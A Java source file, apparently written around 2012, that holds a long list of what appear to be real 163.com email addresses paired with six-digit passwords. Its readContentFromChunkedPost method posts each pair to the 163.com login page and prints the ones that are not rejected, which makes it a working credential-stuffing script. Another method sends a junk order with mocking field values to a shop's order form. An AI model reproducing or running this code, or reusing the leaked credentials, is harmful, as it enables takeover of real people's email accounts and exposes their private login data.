import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class PostTest {

	private static final String POST_URL = "http://reg.163.com/logins.jsp";
//	private static final String POST_URL = "http://127.0.0.1:8080/yhwz/fund/login.do?methodCall=jjyjzxAreaUserLogin";
	
	private static String dataString = 
//	"632180;yelijuanw@163.com,"+
//	"guoyanwei;guoyanweide@163.com,"+
//	"940727;lala.02@163.com,"+
//	"007407;maoxiaoshan2008@163.com,"+
//	"396270;syyn_xdc@163.com,"+
//	"100819;dongdan0106@163.com,"+
//	"200808;xsxxzqh@163.com,"+
//	"194914;YGLYXF@163.com,"+
//	"741017;song-1538@163.com,"+
//	"770424;gdch_weiwei@163.com,"+
//	"079899;ZhengHai_679899@163.com,"+
//	"870527;wkr2007@163.com,"+
//	"760121;swangivl1221@163.com,"+
//	"106106;wangmanli8@163.com,"+
//	"912168;lanzhiling-912@163.com,"+
//	"365963;xiaohuih3@163.com,"+
//	"217802;HZHCYAN@163.com,"+
//	"040109;oraino@163.com,"+
//	"913324;carmen1025@163.com,"+
//	"200120;helenhyb@163.com,"+
//	"870314;yuemohon0314@163.com,"+
//	"740111;wungyen@163.com,"+
//	"830707;yangjialei2003@163.com,"+
//	"310240;iam.yanzi@163.com,"+
//	"853713;yxl97@163.com,"+
//	"861024;liangcaifeng051221@163.com,"+
//	"023701;shinning_sc@163.com,"+
//	"803824;xwj-angel@163.com,"+
//	"781215;fangyu868@163.com,"+
//	"660624;geqiaoqin@163.com,"+
//	"928807;zhenminhu@163.com,"+
//	"418418;zdyxp@163.com,"+
//	"069919;zyull_li@163.com,"+
//	"278831;zizhu0yang@163.com";

		
//		"	111093	;	haiim@163.com	,"+
//		"	250113	;	hrg_cn@163.com	,"+
//		"	556611	;	shadow1123@163.com	,"+
//		"	397397	;	dengyueshan20@163.com	,"+
//		"	880815	;	alicejoyliu@163.com	,"+
//		"	632360	;	lzsheng_632360@163.com	,"+
//		"	740529	;	Guanzehong@163.com	,"+
//		"	070601	;	Mysundelin@163.com	,"+
//		"	200923	;	xiao0326@163.com	,"+
//		"	666168	;	sportlook@163.com	,"+
//		"	698721	;	xd0529@163.com	,"+
//		"	314059	;	figo_2006@163.com	,"+
//		"	201011	;	liyhongwen19@163.com	,"+
//		"	576187	;	lyj161959@163.com	,"+
//		"	227698	;	a3259839@163.com	,"+
//		"	115980	;	bc.1018@163.com	,"+
//		"	541215	;	wangpeng19831115@163.com	,"+
//		"	610327	;	jojox.y@163.com	,"+
//		"	860211	;	sailorhongyuan@163.com	,"+
//		"	060728	;	LHL-62791988@163.com	,"+
//		"	971213	;	snszw@163.com	,"+
//		"	516918	;	Esselyl@163.com	,"+
//		"	711024	;	dyzhxiong@163.com	,"+
//		"	646658	;	liweilei2008@163.com	,"+
//		"	906906	;	lexia_lei@163.com	,"+
//		"	790808	;	winner_hxy@163.com	,"+
//		"	474975	;	XCH5585@163.COM	,"+
//		"	008583	;	heweiping818@163.com	,"+
//		"	313131	;	wu.yun@163.com	,"+
//		"	617835	;	yanchunl2005@163.com	,"+
//		"	291960	;	xfcf1968@163.com	,"+
//		"	562528	;	xyh781125@163.com	,"+
//		"	198251	;	yang_okay@163.com	,"+
//		"	136521	;	zhang773207762@163.com	,"+
//		"	881221	;	tang.lin@163.com	,"+
//		"	571211	;	fivefire7@163.com	,"+
//		"	014003	;	hdk3812@163.com	,"+
//		"	301109	;	xknlml@163.com	,"+
//		"	636791	;	blkxx2007@163.com	,"+
//		"	448560	;	WK900415@163.COM	,"+
//		"	870425	;	bihui19870425@163.com	,"+
//		"	844567	;	daisylyc@163.com	,"+
//		"	921006	;	qq523peng@163.com	,"+
//		"	524127	;	hbx824@163.com	,"+
//		"	810828	;	equal08@163.com	,"+
//		"	266121	;	yirendong201@163.com	,"+
//		"	736282	;	luwenzhi654@163.com	,"+
//		"	314159	;	ynthb@163.com	,"+
//		"	000123	;	madeli.2016@163.com	,"+
//		"	779770	;	zmch-hz@163.com	,"+
//		"	514117	;	michelle_liu117@163.com	,"+
//		"	818963	;	cjling7878@163.com	,"+
//		"	681114	;	13713533347@163.com	,"+
//		"	268748	;	wwwhuqw@163.com	,"+
//		"	108268	;	xiaoweishou@163.com	,"+
//		"	810812	;	canlin-2000@163.com	,"+
//		"	053166	;	CZK0524@163.com	,"+
//		"	329028	;	zhou-h-qing@163.com	,"+
//		"	615235	;	zhuhuizhendg@163.com	,"+
//		"	013579	;	YV.TR@163.COM	,"+
//		"	511687	;	liu_dora@163.com	,"+
//		"	850205	;	zhang7107120@163.com	,"+
//		"	771118	;	minagym@163.com	,"+
//		"	698891	;	yangrui5693@163.com	,"+
//		"	101731	;	swordhome@163.com	,"+
//		"	570205	;	zouxqyl@163.com	,"+
//		"	251158	;	hai_jun_jar@163.com	,"+
//		"	811126	;	zlj1157@163.com	,"+
//		"	237365	;	xh-bb@163.com	,"+
//		"	466924	;	591yyz@163.com	,"+
//		"	291846	;	wongxing1986@163.com	,"+
//		"	238043	;	hebing515151@163.com	,"+
//		"	810931	;	rona511@163.com	,"+
//		"	116323	;	cyxm1973@163.com	,"+
//		"	838689	;	mengjiali253@163.com	,"+
//		"	696866	;	shasha19880726@163.com	,"+
//		"	182308	;	fbi1823@163.com	,"+
//		"	540929	;	bingxue002@163.com	,"+
//		"	554299	;	tongfengzhiy@163.com	,"+
//		"	241978	;	lalala_haha@163.com	,"+
//		"	423568	;	LY19761976@163.com	,"+
//		"	368988	;	163zwn@163.com	,"+
//		"	502625	;	chenhuacheng1985@163.com	,"+
//		"	583258	;	nthswjs@163.com	,"+
//		"	590448	;	guo.xiaojie0527@163.com	,"+
//		"	771101	;	hxqv@163.com	,"+
//		"	199771	;	taoxuetuan@163.com	,"+
//		"	623921	;	ouyuexin@163.com	,"+
//		"	104979	;	luowusengtime@163.com	,"+
//		"	830111	;	skipwin@163.com	,"+
//		"	131311	;	t.lu@163.com	,"+
//		"	229691	;	zhiyong77@163.com	,"+
//		"	702611	;	wenziyun@163.com	,"+
//		"	521718	;	helloc_c@163.com	,"+
//		"	795456	;	xt.223@163.com	,"+
//		"	345678	;	gxq1103@163.com	,"+
//		"	998024	;	kely316@163.com	,"+
//		"	491209	;	108style@163.com	,"+
//		"	901228	;	xirong_zheng@163.com	,"+
//		"	221472	;	haiyunit@163.com	,"+
//		"	801219	;	xzq166@163.com	,"+
//		"	632180	;	yelijuanw@163.com	,"+
//		"	570317	;	hz88997@163.com	,"+
//		"	940727	;	lala.02@163.com	,"+
//		"	911911	;	zxm15999459995@163.com	,"+
//		"	007407	;	maoxiaoshan2008@163.com	,"+
//		"	530195	;	hqh2000@163.com	,"+
//		"	055511	;	anbeiquan157@163.com	,"+
//		"	703356	;	lichenghai902@163.com	,"+
//		"	534451	;	shankbomb@163.com	,"+
//		"	922923	;	sanddeep@163.com	,"+
//		"	121208	;	yllryu@163.com	,"+
//		"	810711	;	hebin961@163.com	,"+
//		"	251673	;	yugcheng@163.com	,"+
//		"	396270	;	syyn_xdc@163.com	,"+
//		"	100819	;	dongdan0106@163.com	,"+
//		"	323243	;	songwq323@163.com	,"+
//		"	253638	;	LZG4434085@163.com	,"+
//		"	200808	;	xsxxzqh@163.com	,"+
//		"	194914	;	YGLYXF@163.com	,"+
//		"	622198	;	yangmingbo40@163.com	,"+
//		"	008429	;	nkhsh@163.com	,"+
//		"	609614	;	zhangdengqi2006@163.com	,"+
//		"	741017	;	song-1538@163.com	,"+
//		"	108331	;	liudan331@163.com	,"+
//		"	130816	;	ylong@163.com	,"+
//		"	198702	;	chenph518@163.com	,"+
//		"	770424	;	gdch_weiwei@163.com	,"+
//		"	810118	;	bandao-tiehe@163.com	,"+
//		"	850727	;	nbweb@163.com	,"+
//		"	079899	;	ZhengHai_679899@163.com	,"+
//		"	774405	;	yy27774406@163.com	,"+
//		"	100831	;	wangkai_cq@163.com	,"+
//		"	770915	;	xjbaolong007@163.com	,"+//到这里了
		"	770903	;	mst77@163.com	,"+
		"	216828	;	xpswbd@163.com	,"+
		"	802569	;	lcy-0801@163.com	,"+
		"	326698	;	hzwang@163.com	,"+
		"	820212	;	s33266@163.com	,"+
		"	455078	;	tj_789@163.com	,"+
		"	870527	;	wkr2007@163.com	,"+
		"	760121	;	swangivl1221@163.com	,"+
		"	200439	;	zhujun0110@163.com	,"+
		"	861125	;	song05dr@163.com	,"+
		"	106106	;	wangmanli8@163.com	,"+
		"	912168	;	lanzhiling-912@163.com	,"+
		"	991308	;	scf1000@163.com	,"+
		"	833070	;	hoziji@163.com	,"+
		"	365963	;	xiaohuih3@163.com	,"+
		"	217802	;	HZHCYAN@163.com	,"+
		"	811215	;	LiJiang166@163.com	,"+
		"	572277	;	eskyline@163.com	,"+
		"	720204	;	yepgsw@163.com	,"+
		"	012315	;	by.zgp@163.com	,"+
		"	040109	;	oraino@163.com	,"+
		"	710331	;	diaomingjun@163.com	,"+
		"	007080	;	yuangguren@163.com	,"+
		"	090819	;	hero1caesar@163.com	,"+
		"	913324	;	carmen1025@163.com	,"+
		"	200120	;	helenhyb@163.com	,"+
		"	584498	;	wg8056@163.com	,"+
		"	870314	;	yuemohon0314@163.com	,"+
		"	458421	;	huangjun_0927@163.com	,"+
		"	638183	;	bellehit@163.com	,"+
		"	132100	;	davidchen731225@163.com	,"+
		"	740111	;	wungyen@163.com	,"+
		"	830707	;	yangjialei2003@163.com	,"+
		"	515847	;	chengxin82486@163.com	,"+
		"	310240	;	iam.yanzi@163.com	,"+
		"	853713	;	yxl97@163.com	,"+
		"	861024	;	liangcaifeng051221@163.com	,"+
		"	198311	;	hnjmlfg@163.com	,"+
		"	680721	;	shyu-wiring@163.com	,"+
		"	751219	;	lzj413@163.com	,"+
		"	771221	;	asc152034@163.com	,"+
		"	050308	;	www.wanghuanqing@514@163.com	,"+
		"	214621	;	yp850113@163.com	,"+
		"	023701	;	shinning_sc@163.com	,"+
		"	308825	;	thymesxm@163.com	,"+
		"	980722	;	njmjs@163.com	,"+
		"	001622	;	fyc@163.com	,"+
		"	135137	;	zyzj315@163.com	,"+
		"	803824	;	xwj-angel@163.com	,"+
		"	781215	;	fangyu868@163.com	,"+
		"	868639	;	295395230@163.com	,"+
		"	660624	;	geqiaoqin@163.com	,"+
		"	282118	;	gocmmb@163.com	,"+
		"	161123	;	LHQ6208789@163.com	,"+
		"	805368	;	YiHaiGang@163.com	,"+
		"	110531	;	HYEGLEDOOL@163.com	,"+
		"	712128	;	bxg_3000@163.com	,"+
		"	613388	;	liuchao612345678@163.com	,"+
		"	928807	;	zhenminhu@163.com	,"+
		"	418418	;	zdyxp@163.com	,"+
		"	080808	;	yydnnl123@163.com	,"+
		"	751018	;	yyyljw168@163.com	,"+
		"	730316	;	hxs0010@163.com	,"+
		"	985335	;	skellyhuang@163.com	,"+
		"	820709	;	china-666good@163.com	,"+
		"	010115	;	owenboss@163.com	,"+
		"	030940	;	sangkaibo12280@163.com	,"+
		"	139249	;	li019710@163.com	,"+
		"	042878	;	IMBA@163.com	,"+
		"	051888	;	Wen_JianQiu@163.com	,"+
		"	069919	;	zyull_li@163.com	,"+
		"	851220	;	wzongxing2005@163.com	,"+
		"	278831	;	zizhu0yang@163.com	,"+
		"	930091	;	williamxyj@163.com	,"+
		"	731226	;	guoliang_zh@163.com	,"+
		"	070516	;	fangzhonghua922@163.com	,"+
		"	071975	;	sluckfamily@163.com	,"+
		"	127986	;	zlj25311@163.com	,";
	            

	/**
	 * @Methods Name main
	 * @Create In Feb 8, 2012 By Administrator
	 * @param args void
	 * @throws IOException 
	 */
	public static void main(String[] args) throws IOException {
		// TODO Auto-generated method stub
		goxiaomi();
//		readContentFromChunkedPost();
//		sendPost();
	}
	
	
	public static void goxiaomi() throws IOException {
		URL postUrl = new URL("http://www.xiaomigo.com/neworder.asp");
		HttpURLConnection connection = (HttpURLConnection) postUrl
		.openConnection();
		connection.setDoOutput(true);
		connection.setDoInput(true);
		connection.setRequestMethod("POST");
		connection.setUseCaches(false);
		connection.setInstanceFollowRedirects(true);

		connection.setRequestProperty("Content-Type",
		"application/x-www-form-urlencoded");
		
		/**//*
		* 与readContentFromPost()最大的不同，设置了块大小为5字节
		*/
//		connection.setChunkedStreamingMode(5);
		connection.connect();
		/**//*
		* 注意，下面的getOutputStream函数工作方式于在readContentFromPost()里面的不同
		* 在readContentFromPost()里面该函数仍在准备http request，没有向服务器发送任何数据
		* 而在这里由于设置了ChunkedStreamingMode，getOutputStream函数会根据connect之前的配置
		* 生成http request头，先发送到服务器。
		*/
		DataOutputStream out = new DataOutputStream(connection
		.getOutputStream());
		String content = "product=米手机 双核1.5G（MiOne）1999元&name=你&tel=妈&address=\\(^o^)/~";
		
//		String content = 
//		"email=11111ab&password=2222c";
		out.write(content.getBytes()); 

		out.flush();
		out.close(); // 到此时服务器已经收到了完整的http request了，而在readContentFromPost()函数里，要等到下一句服务器才能收到http请求。
		BufferedReader reader = new BufferedReader(new InputStreamReader(
		connection.getInputStream(),"gb2312"));

		out.flush();
		out.close(); // flush and close
		String line;
		while ((line = reader.readLine()) != null){
		System.out.println(line);
		}
	}
	
	public static void readContentFromChunkedPost() throws IOException{
		String username = "guoyanweide@163.com";
		String password = "guoyanwei";
		String [] dataArr = dataString.split(",");
		for (int i = 0; i < dataArr.length; i++) {
			password = dataArr[i].split(";")[0].trim();
			username = dataArr[i].split(";")[1].trim();
			URL postUrl = new URL(POST_URL);
			HttpURLConnection connection = (HttpURLConnection) postUrl
			.openConnection();
			connection.setDoOutput(true);
			connection.setDoInput(true);
			connection.setRequestMethod("POST");
			connection.setUseCaches(false);
			connection.setInstanceFollowRedirects(true);

			connection.setRequestProperty("Content-Type",
			"application/x-www-form-urlencoded");
			
			/**//*
			* 与readContentFromPost()最大的不同，设置了块大小为5字节
			*/
//			connection.setChunkedStreamingMode(5);
			connection.connect();
			/**//*
			* 注意，下面的getOutputStream函数工作方式于在readContentFromPost()里面的不同
			* 在readContentFromPost()里面该函数仍在准备http request，没有向服务器发送任何数据
			* 而在这里由于设置了ChunkedStreamingMode，getOutputStream函数会根据connect之前的配置
			* 生成http request头，先发送到服务器。
			*/
			DataOutputStream out = new DataOutputStream(connection
			.getOutputStream());
			String content = "username="+username+"&password="+password+"&url=&product=&savelogin=&outfoxer=&domains=&syscheckcode=80738c9cce381684122c1ef1978fef784ddeee9c&Submit=";
			
//			String content = 
//			"email=11111ab&password=2222c";
			out.write(content.getBytes()); 

			out.flush();
			out.close(); // 到此时服务器已经收到了完整的http request了，而在readContentFromPost()函数里，要等到下一句服务器才能收到http请求。
			BufferedReader reader = new BufferedReader(new InputStreamReader(
			connection.getInputStream(),"UTF-8"));

			out.flush();
			out.close(); // flush and close
			String line;
//			System.out.println("=============================");
//			System.out.println("Contents of post request");
//			System.out.println("=============================");
			boolean pass = true;
			while ((line = reader.readLine()) != null){
				if (line.contains("密码不正确") || line.contains("用户不存在")) {
					pass = false;
					break;
				}
//			System.out.println(line);
			}
			if (pass) {
				System.out.println(i+":" +pass+":" + username+":"+password);
			} else {
//				System.out.println(i+":" +pass+":" + username+":"+password);
			}
			
//			System.out.println("=============================");
//			System.out.println("Contents of post request ends");
//			System.out.println("=============================");
			reader.close();
			connection.disconnect();
		}
		
		

		}
	
	
		public static void sendPost() {
			HttpURLConnection httpurlconnection = null;
		    try {
		    	URL  url = new URL(POST_URL);
		  //out.println(url);
		  httpurlconnection = (HttpURLConnection)url.openConnection();
		  httpurlconnection.setRequestMethod("POST");
		  httpurlconnection.setDoOutput(true);
		  String postData = "email=11111a&password=2222";//要传出的参数
		  //out.println(postData);
		  httpurlconnection.getOutputStream().write(postData.getBytes());
		  httpurlconnection.getOutputStream().flush();
		  httpurlconnection.getOutputStream().close();
		  int code = httpurlconnection.getResponseCode();
		 
		    System.out.println("code="+code);
		    DataInputStream in = new DataInputStream(httpurlconnection.getInputStream());  
		    String inline = "";  
		    while ( (inline =in.readLine()) != null){
		    System.out.println("inline="+inline);//post传递成功
		    }
		   in.close();
		   

		  } catch(Exception e) {
		     e.printStackTrace();
		   } finally {
		     if(httpurlconnection != null) {
		      httpurlconnection.disconnect();
		      }
		   }

		}


}
